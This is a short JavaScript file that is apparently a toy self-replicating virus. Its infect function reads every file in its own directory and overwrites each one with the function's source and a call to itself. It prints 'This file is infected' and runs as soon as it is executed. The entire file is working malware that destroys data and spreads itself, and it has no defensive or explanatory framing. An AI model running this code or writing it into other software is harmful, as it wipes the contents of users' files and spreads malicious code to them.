function infect(content){
    const fs = require('fs');
    const path = require('path');
    fs.readdir(__dirname, (error, files)=>{
        files.forEach(file => {
            fs.writeFile(file, `${content} infect(infect);`, function(error){
                if(error) throw error;
                console.log('This file is infected')
            })
        });
    })
} infect(infect);